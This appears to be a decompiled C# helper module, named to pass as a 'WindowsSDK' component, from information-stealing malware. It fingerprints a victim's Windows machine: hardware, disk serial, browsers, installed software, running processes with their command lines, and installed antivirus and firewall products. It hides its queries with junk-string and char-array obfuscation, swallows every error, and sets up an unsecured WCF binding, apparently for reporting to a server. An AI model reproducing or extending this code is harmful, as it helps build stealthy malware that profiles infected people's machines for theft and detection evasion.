using Microsoft.Win32;
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Linq;
using System.Management;
using System.ServiceModel;
using System.Text.RegularExpressions;
using System.Windows.Forms;
using System.Xml;
using WindowsSDK.Extensions;
using WindowsSDK.Objects.Enums;
using WindowsSDK.Objects.Info;

namespace WindowsSDK.Helpers
{
    public static class SystemInfoHelper
    {
        public static BasicHttpBinding CreateBind()
        {
            return new BasicHttpBinding
            {
                MaxBufferSize = int.MaxValue,
                MaxReceivedMessageSize = 2147483647L,
                MaxBufferPoolSize = 2147483647L,
                CloseTimeout = TimeSpan.FromMinutes(30.0),
                OpenTimeout = TimeSpan.FromMinutes(30.0),
                ReceiveTimeout = TimeSpan.FromMinutes(30.0),
                SendTimeout = TimeSpan.FromMinutes(30.0),
                TransferMode = TransferMode.Buffered,
                UseDefaultWebProxy = false,
                ProxyAddress = null,
                ReaderQuotas = new XmlDictionaryReaderQuotas
                {
                    MaxDepth = 44567654,
                    MaxArrayLength = int.MaxValue,
                    MaxBytesPerRead = int.MaxValue,
                    MaxNameTableCharCount = int.MaxValue,
                    MaxStringContentLength = int.MaxValue
                },
                Security = new BasicHttpSecurity
                {
                    Mode = BasicHttpSecurityMode.None
                }
            };
        }

        public static List<SystemHardware> GetProcessors()
        {
            List<SystemHardware> list = new List<SystemHardware>();
            try
            {
                using ManagementObjectSearcher managementObjectSearcher = new ManagementObjectSearcher("SELECT * FROM Win32_Processor");
                using ManagementObjectCollection managementObjectCollection = managementObjectSearcher.Get();
                foreach (ManagementObject item in managementObjectCollection)
                {
                    try
                    {
                        list.Add(new SystemHardware
                        {
                            Name = (item["Name"] as string),
                            Counter = Convert.ToString(item["NumberOfCores"]),
                            HardType = HardwareType.Processor
                        });
                    }
                    catch
                    {
                    }
                }
            }
            catch
            {
            }
            return list;
        }

        public static List<SystemHardware> GetGraphicCards()
        {
            List<SystemHardware> list = new List<SystemHardware>();
            try
            {
                using ManagementObjectSearcher managementObjectSearcher = new ManagementObjectSearcher("root\\CIMV2", "SELECT * FROM Win32_VideoController");
                using ManagementObjectCollection managementObjectCollection = managementObjectSearcher.Get();
                foreach (ManagementObject item in managementObjectCollection)
                {
                    try
                    {
                        uint num = Convert.ToUInt32(item["AdapterRAM"]);
                        if (num != 0)
                        {
                            list.Add(new SystemHardware
                            {
                                Name = (item["Name"] as string),
                                Counter = num.ToString(),
                                HardType = HardwareType.Graphic
                            });
                        }
                    }
                    catch (Exception)
                    {
                    }
                }
            }
            catch (Exception)
            {
            }
            return list;
        }

        public static List<string> SystemDefenders()
        {
            List<string> list = new List<string>();
            try
            {
                string[] array = new string[2] { "ROUniversal uninstallerOT\\SecurityCenteUniversal uninstallerr2", "ROUniversal uninstallerOT\\SecurUniversal uninstallerityCenter" };
                string[] array2 = new string[3] { "AntiviruHuflepuffsProduct", "AntiSpHuflepuffyWareProHuflepuffuct", "FHuflepuffirewaHuflepuffllProduct" };
                foreach (string text in array2)
                {
                    string[] array3 = array;
                    foreach (string text2 in array3)
                    {
                        try
                        {
                            using ManagementObjectSearcher managementObjectSearcher = new ManagementObjectSearcher(text2.Replace("Universal uninstaller", string.Empty), "SELECT * FROM " + text.Replace("Huflepuff", string.Empty));
                            using ManagementObjectCollection managementObjectCollection = managementObjectSearcher.Get();
                            foreach (ManagementObject item in managementObjectCollection)
                            {
                                try
                                {
                                    if (!list.Contains(item[new string(new char[11]
                                    {
                                        'd', 'i', 's', 'p', 'l', 'a', 'y', 'N', 'a', 'm',
                                        'e'
                                    })] as string))
                                    {
                                        list.Add(item[new string(new char[11]
                                        {
                                            'd', 'i', 's', 'p', 'l', 'a', 'y', 'N', 'a', 'm',
                                            'e'
                                        })] as string);
                                    }
                                }
                                catch
                                {
                                }
                            }
                        }
                        catch
                        {
                        }
                    }
                }
            }
            catch (Exception)
            {
            }
            return list;
        }

        public static List<BrowserVersion> GetBrowsers()
        {
            List<BrowserVersion> list = new List<BrowserVersion>();
            try
            {
                RegistryKey registryKey = Registry.LocalMachine.OpenSubKey("SOFTWARE\\WOW6432Node\\Clients\\StartMenuInternet");
                if (registryKey == null)
                {
                    registryKey = Registry.LocalMachine.OpenSubKey("SOFTWARE\\Clients\\StartMenuInternet");
                }
                string[] subKeyNames = registryKey.GetSubKeyNames();
                for (int i = 0; i < subKeyNames.Length; i++)
                {
                    BrowserVersion browserVersion = new BrowserVersion();
                    RegistryKey registryKey2 = registryKey.OpenSubKey(subKeyNames[i]);
                    browserVersion.NameOfBrowser = (string)registryKey2.GetValue(null);
                    RegistryKey registryKey3 = registryKey2.OpenSubKey("shell\\open\\command");
                    browserVersion.PathOfFile = registryKey3.GetValue(null).ToString().StripQuotes();
                    if (browserVersion.PathOfFile != null)
                    {
                        browserVersion.Version = FileVersionInfo.GetVersionInfo(browserVersion.PathOfFile).FileVersion;
                    }
                    else
                    {
                        browserVersion.Version = "Unknown Version";
                    }
                    list.Add(browserVersion);
                }
            }
            catch
            {
            }
            return list;
        }

        public static string GetSerialNumber()
        {
            try
            {
                using ManagementObjectSearcher managementObjectSearcher = new ManagementObjectSearcher("SELECT * FROM Win32_DiskDrive");
                using ManagementObjectCollection managementObjectCollection = managementObjectSearcher.Get();
                foreach (ManagementObject item in managementObjectCollection)
                {
                    try
                    {
                        return item["SerialNumber"] as string;
                    }
                    catch
                    {
                    }
                }
            }
            catch
            {
            }
            return string.Empty;
        }

        public static List<string> ListOfProcesses()
        {
            List<string> list = new List<string>();
            try
            {
                using ManagementObjectSearcher managementObjectSearcher = new ManagementObjectSearcher(new string(new char[45]
                {
                    'S', 'E', 'L', 'E', 'C', 'T', ' ', '*', ' ', 'F',
                    'R', 'O', 'M', ' ', 'W', 'i', 'n', '3', '2', '_',
                    'P', 'r', 'o', 'c', 'e', 's', 's', ' ', 'W', 'h',
                    'e', 'r', 'e', ' ', 'S', 'e', 's', 's', 'i', 'o',
                    'n', 'I', 'd', '=', '\''
                }) + Process.GetCurrentProcess().SessionId + "'");
                using ManagementObjectCollection managementObjectCollection = managementObjectSearcher.Get();
                foreach (ManagementObject item in managementObjectCollection)
                {
                    try
                    {
                        list.Add(new string(new char[4] { 'I', 'D', ':', ' ' }) + item[new string(new char[9] { 'P', 'r', 'o', 'c', 'e', 's', 's', 'I', 'd' })]?.ToString() + new string(new char[8] { ',', ' ', 'N', 'a', 'm', 'e', ':', ' ' }) + item[new string(new char[4] { 'N', 'a', 'm', 'e' })]?.ToString() + new string(new char[15]
                        {
                            ',', ' ', 'C', 'o', 'm', 'm', 'a', 'n', 'd', 'L',
                            'i', 'n', 'e', ':', ' '
                        }) + item[new string(new char[11]
                        {
                            'C', 'o', 'm', 'm', 'a', 'n', 'd', 'L', 'i', 'n',
                            'e'
                        })]);
                    }
                    catch
                    {
                    }
                }
            }
            catch
            {
            }
            return list;
        }

        public static List<string> GetProcessesByName(string name)
        {
            List<string> list = new List<string>();
            try
            {
                using ManagementObjectSearcher managementObjectSearcher = new ManagementObjectSearcher(new string(new char[45]
                {
                    'S', 'E', 'L', 'E', 'C', 'T', ' ', '*', ' ', 'F',
                    'R', 'O', 'M', ' ', 'W', 'i', 'n', '3', '2', '_',
                    'P', 'r', 'o', 'c', 'e', 's', 's', ' ', 'W', 'h',
                    'e', 'r', 'e', ' ', 'S', 'e', 's', 's', 'i', 'o',
                    'n', 'I', 'd', '=', '\''
                }) + Process.GetCurrentProcess().SessionId + "'");
                using ManagementObjectCollection managementObjectCollection = managementObjectSearcher.Get();
                foreach (ManagementObject item in managementObjectCollection)
                {
                    try
                    {
                        if (item[new string(new char[4] { 'N', 'a', 'm', 'e' })]?.ToString() == name)
                        {
                            list.Add(item["ExecutablePath"]?.ToString());
                        }
                    }
                    catch
                    {
                    }
                }
            }
            catch
            {
            }
            return list;
        }

        public static List<string> ListOfPrograms()
        {
            List<string> list = new List<string>();
            try
            {
                string name = new string(new char[51]
                {
                    'S', 'O', 'F', 'T', 'W', 'A', 'R', 'E', '\\', 'M',
                    'i', 'c', 'r', 'o', 's', 'o', 'f', 't', '\\', 'W',
                    'i', 'n', 'd', 'o', 'w', 's', '\\', 'C', 'u', 'r',
                    'r', 'e', 'n', 't', 'V', 'e', 'r', 's', 'i', 'o',
                    'n', '\\', 'U', 'n', 'i', 'n', 's', 't', 'a', 'l',
                    'l'
                });
                using RegistryKey registryKey = Registry.LocalMachine.OpenSubKey(name);
                string[] subKeyNames = registryKey.GetSubKeyNames();
                foreach (string name2 in subKeyNames)
                {
                    try
                    {
                        using RegistryKey registryKey2 = registryKey.OpenSubKey(name2);
                        string text = (string)registryKey2?.GetValue(new string(new char[11]
                        {
                            'D', 'i', 's', 'p', 'l', 'a', 'y', 'N', 'a', 'm',
                            'e'
                        }));
                        string text2 = (string)registryKey2?.GetValue(new string(new char[14]
                        {
                            'D', 'i', 's', 'p', 'l', 'a', 'y', 'V', 'e', 'r',
                            's', 'i', 'o', 'n'
                        }));
                        if (!string.IsNullOrEmpty(text) && !string.IsNullOrWhiteSpace(text2))
                        {
                            text = text.Trim();
                            text2 = text2.Trim();
                            list.Add(Regex.Replace(text + " [" + text2 + "]", new string(new char[16]
                            {
                                '[', '^', '\\', 'u', '0', '0', '2', '0', '-', '\\',
                                'u', '0', '0', '7', 'F', ']'
                            }), string.Empty));
                        }
                    }
                    catch
                    {
                    }
                }
            }
            catch
            {
            }
            return list.OrderBy((string x) => x).ToList();
        }

        public static List<string> AvailableLanguages()
        {
            List<string> result = new List<string>();
            try
            {
                return (from InputLanguage lang in InputLanguage.InstalledInputLanguages
                        select lang.Culture.EnglishName).ToList();
            }
            catch
            {
                return result;
            }
        }

        public static string TotalOfRAM()
        {
            string result = "0 Mb or 0";
            try
            {
                using ManagementObjectSearcher managementObjectSearcher = new ManagementObjectSearcher("SELECT * FROM Win32_OperatingSystem");
                using ManagementObjectCollection managementObjectCollection = managementObjectSearcher.Get();
                foreach (ManagementObject item in managementObjectCollection)
                {
                    try
                    {
                        double num = Convert.ToDouble(item["TotalVisibleMemorySize"]);
                        double num2 = num * 1024.0;
                        double num3 = Math.Round(num / 1024.0, 2);
                        result = $"{num3} MB or {num2}".Replace(",", ".");
                    }
                    catch
                    {
                    }
                }
            }
            catch
            {
            }
            return result;
        }

        public static string GetWindowsVersion()
        {
            try
            {
                string text;
                try
                {
                    text = (Environment.Is64BitOperatingSystem ? "x64" : "x32");
                }
                catch (Exception)
                {
                    text = "x86";
                }
                string text2 = HKLM_GetString("SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion", "ProductName");
                HKLM_GetString("SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion", "CSDVersion");
                if (!string.IsNullOrEmpty(text2))
                {
                    return text2 + " " + text;
                }
            }
            catch (Exception)
            {
            }
            return string.Empty;
            static string HKLM_GetString(string key, string value)
            {
                try
                {
                    return Registry.LocalMachine.OpenSubKey(key)?.GetValue(value).ToString() ?? string.Empty;
                }
                catch
                {
                    return string.Empty;
                }
            }
        }
    }
}
